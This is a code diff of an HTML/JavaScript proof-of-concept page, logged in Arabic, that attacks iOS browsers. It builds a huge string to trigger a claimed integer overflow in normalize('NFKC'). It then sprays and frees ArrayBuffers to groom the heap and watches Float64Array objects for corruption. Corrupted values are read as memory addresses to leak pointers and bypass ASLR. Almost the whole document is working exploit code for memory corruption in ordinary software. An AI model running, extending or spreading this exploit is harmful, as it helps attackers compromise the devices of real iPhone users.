@@ -2,68 +2,153 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>iOS ASLR Bypass Test</title>
+<title>iOS normalize() Groomed Overflow</title>
 </head>
 <body>
-<button onclick="test()">تشغيل: iOS Info Leak (normalize)</button>
-<pre id="log" style="white-space: pre-wrap; word-break: break-all;"></pre>
+<button onclick="test()">تشغيل: Groomed Overflow</button>
+<pre id="log" style="white-space:pre-wrap;word-break:break-all;font-size:11px;"></pre>
 <script>
-function log(m) {
-    document.getElementById('log').textContent += m + '\n';
-}
+function log(m){document.getElementById('log').textContent+=m+'\n';}
+function cp(s){try{localStorage.setItem('cp',s);}catch(e){}}
 
-async function test() {
-    log('=== iOS normalize() Integer Overflow Info Leak ===');
+async function test(){
+    log('=== iOS Groomed normalize() Overflow ===');
+    cp('START');
 
-    const N = 238609295; // العدد الدقيق لـ Integer Overflow
-    log('[*] محاولة إنشاء نص بحجم ' + N + ' حرف (~457MB)...');
+    // حجم التجاوز الدقيق
+    const N = 238609295;
+    log('[1] إنشاء النص (' + N + ' حرف = ~457MB)...');
+    cp('STR_CREATE');
 
+    let str;
     try {
-        // إنشاء النص الضخم
-        let str = '\uFDFA'.repeat(N);
-        log('[+] تم إنشاء النص! الطول: ' + str.length);
+        str = '\uFDFA'.repeat(N);
+        log('[+] تم! الطول: ' + str.length);
+    } catch(e) {
+        log('[X] فشل إنشاء النص: ' + e.message);
+        log('[X] الجهاز لا يملك ذاكرة كافية');
+        return;
+    }
+    cp('STR_OK');
 
-        log('[*] استدعاء normalize("NFKC")... (هذا قد يستغرق ثواني)');
-        
-        // استدعاء الدالة التي تسبب التجاوز
-        let result = str.normalize("NFKC");
+    // Heap Grooming: إنشاء ثقوب بحجم 28 بايت
+    log('[2] تهيئة الكومة (Heap Grooming)...');
+    let sprays = [];
+    for (let i = 0; i < 5000; i++) {
+        sprays.push(new ArrayBuffer(28)); // نفس حجم buffer الـ 14 حرف
+    }
+    log('[+] تم إنشاء ' + sprays.length + ' ArrayBuffer (28 بايت)');
 
-        log('[+] normalize() عادت بنجاح!');
-        log('[!] طول النتيجة: ' + result.length);
+    // حرر نصفها لخلق ثقوب
+    for (let i = 0; i < sprays.length; i += 2) {
+        sprays[i] = null;
+    }
+    log('[+] تم تحرير النصف لخلق ثقوب');
 
-        // المتوقع: 14 (بسبب التجاوز العددي)
-        if (result.length < 100 && result.length > 0) {
-            log('[!!!] INTEGER OVERFLOW CONFIRMED!');
-            log('[!!!] الطول المتوقع كان 4.3 مليار، حصلنا على: ' + result.length);
-            log('[*] فحص البايتات المسربة (البحث عن مؤشرات)...');
+    // spray آخر بـ Float64Array لمراقبة التلف
+    let monitors = [];
+    for (let i = 0; i < 100; i++) {
+        let buf = new ArrayBuffer(64);
+        let view = new Float64Array(buf);
+        view[0] = 1.337; // قيمة مميزة
+        view[1] = 2.718;
+        view[2] = 3.141;
+        monitors.push({buf, view, original: [view[0], view[1], view[2]]});
+    }
+    log('[+] تم إنشاء ' + monitors.length + ' Float64Array مراقب');
 
-            let hex = [];
-            let suspicious = false;
-            for (let i = 0; i < result.length; i++) {
-                let code = result.charCodeAt(i);
-                hex.push(code.toString(16).padStart(4, '0'));
-                
-                // مؤشرات iOS عادة تبدأ بـ 0x00000001 أو 0x000000016
-                if (code > 0x1000) suspicious = true;
+    // إجبار GC لتنظيف الثقوب
+    if (typeof gc === 'function') { gc(); gc(); }
+    else { for(let i=0;i<100;i++) new ArrayBuffer(1024); }
+    log('[+] GC تم');
+
+    // الآن استدعِ normalize()
+    log('[3] استدعاء normalize("NFKC")...');
+    cp('CALL_NORMALIZE');
+
+    let result = null;
+    try {
+        result = str.normalize("NFKC");
+        cp('NORMALIZE_OK');
+        log('[+] normalize() عادت! الطول: ' + result.length);
+    } catch(e) {
+        cp('NORMALIZE_THROW:' + e.message);
+        log('[!] normalize() رمى استثناء: ' + e.message);
+        log('[!] هذا قد يعني أن الـ OOB Write حدث وتم التقاطه');
+    }
+
+    // فحص الـ monitors هل تلف أي منها؟
+    log('[4] فحص Float64Array المراقبين...');
+    let corrupted = 0;
+    for (let i = 0; i < monitors.length; i++) {
+        let m = monitors[i];
+        try {
+            let v0 = m.view[0], v1 = m.view[1], v2 = m.view[2];
+            if (v0 !== m.original[0] || v1 !== m.original[1] || v2 !== m.original[2]) {
+                corrupted++;
+                log('[!] Monitor #' + i + ' CORRUPTED!');
+                log('    قبل: ' + m.original[0] + ', ' + m.original[1] + ', ' + m.original[2]);
+                log('    بعد: ' + v0 + ', ' + v1 + ', ' + v2);
+
+                // لو القيم الجديدة تبدو كعنوان ذاكرة
+                let buf = new ArrayBuffer(8);
+                new Float64Array(buf)[0] = v0;
+                let low = new Uint32Array(buf)[0];
+                let high = new Uint32Array(buf)[1];
+                let addr = (BigInt(high) << 32n) | BigInt(low);
+                log('    v0 كعنوان: 0x' + addr.toString(16));
             }
-            log('[!] Hex: ' + hex.join(' '));
-            
-            if (suspicious) {
-                log('[★★★] LEAK DETECTED! ASLR BYPASSed on iOS!');
-            } else {
-                log('[-] القيم تبدو صفرية أو صغيرة، قد تحتاج لتهيئة الكومة (Heap Grooming)');
-            }
-        } else if (result.length === 0) {
-            log('[-] النتيجة فارغة (ICU فشلت دون تجاوز)');
-        } else {
-            log('[-] النتيجة طويلة (' + result.length + ')، التجاوز لم يحدث.');
-        }
-    } catch (e) {
-        log('[X] خطأ: ' + e.message);
-        if (e.message.includes("OutOfMemory")) {
-            log('[X] الجهاز لا يمتلك ذاكرة كافية لهذا النص.');
+        } catch(e) {
+            corrupted++;
+            log('[!] Monitor #' + i + ' CRASH على القراءة: ' + e.message);
         }
     }
+
+    log('[*] Monitors تالفة: ' + corrupted + '/' + monitors.length);
+
+    // لو عندنا نتيجة normalize، افحصها
+    if (result && result.length > 0 && result.length < 100) {
+        log('[5] فحص نتيجة normalize()...');
+        log('[!] الطول قصير: ' + result.length);
+        let hex = [];
+        for (let i = 0; i < result.length; i++) {
+            hex.push(result.charCodeAt(i).toString(16).padStart(4, '0'));
+        }
+        log('[!] Hex: ' + hex.join(' '));
+
+        // ابحث عن قيم تبدو كعنوان
+        for (let i = 0; i < result.length - 3; i++) {
+            let val = result.charCodeAt(i) | (result.charCodeAt(i+1) << 16);
+            if (val > 0x10000) {
+                log('[?] قيمة مشبوهة عند index ' + i + ': 0x' + val.toString(16));
+            }
+        }
+    }
+
+    // فحص الـ sprays المتبقية
+    log('[6] فحص ArrayBuffers المتبقية...');
+    let sprayCorrupted = 0;
+    for (let i = 1; i < sprays.length; i += 2) {
+        if (sprays[i]) {
+            let view = new Uint8Array(sprays[i]);
+            let nonZero = 0;
+            for (let j = 0; j < 28; j++) {
+                if (view[j] !== 0) nonZero++;
+            }
+            if (nonZero > 0 && nonZero < 28) {
+                sprayCorrupted++;
+                if (sprayCorrupted <= 3) {
+                    let hex = [];
+                    for (let j = 0; j < 28; j++) hex.push(view[j].toString(16).padStart(2,'0'));
+                    log('[!] Spray #' + i + ' يحتوي بيانات: ' + hex.join(' '));
+                }
+            }
+        }
+    }
+    log('[*] Sprays تالفة: ' + sprayCorrupted);
+
+    cp('DONE');
+    log('=== انتهى ===');
 }
 </script>
 </body>
